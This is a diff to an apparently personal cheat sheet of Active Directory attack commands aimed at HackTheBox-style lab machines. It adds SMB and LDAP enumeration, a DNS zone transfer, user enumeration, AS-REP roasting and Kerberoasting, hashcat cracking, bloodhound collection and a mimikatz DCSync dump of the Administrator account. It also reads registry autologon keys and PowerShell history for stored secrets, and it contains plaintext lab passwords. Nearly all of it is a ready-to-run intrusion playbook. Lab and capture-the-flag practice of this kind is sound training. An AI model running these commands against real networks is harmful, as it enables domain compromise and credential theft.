@@ -7,15 +7,22 @@ nmap 10.10.10.175 --script=smb-enum* -p445
 ## anon
 smbclient -L 10.10.10.175 -N
 smbclient -L 10.10.10.175 -U "Egotistical-bank.local/fsmith"
+smbclient "\\\\10.10.10.175\\RICOH Aficio SP 8300DN PCL 6" -U "Egotistical-bank.local/fsmith"
+
 > recurse on
 > prompt off
 > ls
 
 
-#smbmap
+# dns
+dig @10.10.10.161 AXFR htb.local
+
+
+# smbmap
 smbmap -H 10.10.10.161
 smbmap -H 10.10.10.10 -u '' -p ''
 smbmap -H 10.10.10.10 -u 'guest' -p ''
+smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.193.5
 
 
 # enum4linux
@@ -31,6 +38,16 @@ rpcclient -U "" -N 10.10.10.161
 > enumdomgroups
 
 
+# LDAP
+## anon
+ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"
+
+
+# kerbrute
+## anon
+kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local
+
+
 # GetNPUsers.py
 ## anon
 GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
@@ -41,19 +58,10 @@ GetNPUsers.py Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pas
 
 ## with username list
 GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
+GetUserSPNs.py -request -dc-ip 10.129.193.5 active.htb/svc_tgs
 
 ## hashcat
 hashcat -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
-
-# LDAP
-## anon
-ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"
-
-
-
-# kerbrute
-## anon
-kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local
 
 
 #crackmapexec(smb/winrm)
@@ -61,6 +69,9 @@ crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
 crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
 crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
 crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
+
+# bloodhound
+bloodhound-python --dns-tcp -ns 10.129.193.5 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
 ```
 
 
@@ -82,6 +93,8 @@ Get-NetUser | select cn
 Get-NetUser | select cn,pwdlastset,lastlogon
 Get-NetGroup | select cn
 Get-NetGroup "Sales Department" | select member
+Get-DomainGroup -MemberIdentity 'svc-alfresco' | select samaccountname
+
 
 Get-NetComputer
 Get-NetComputer | select operatingsystem,dnshostname
@@ -98,8 +111,6 @@ Find-DomainShare
 # PsLoggedon.exe
 .\PsLoggedon.exe \\files04
 
-
-
 cmdkey /list
 cat (Get-PSReadlineOption).HistorySavePath
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
@@ -107,6 +118,14 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 
 # kerberoast
 .\Rubeus.exe kerberoast
+
+
+
+
+
+# mimikatz
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:Egotistical-bank.local /user:Administrator"'
+
 
 
 ```
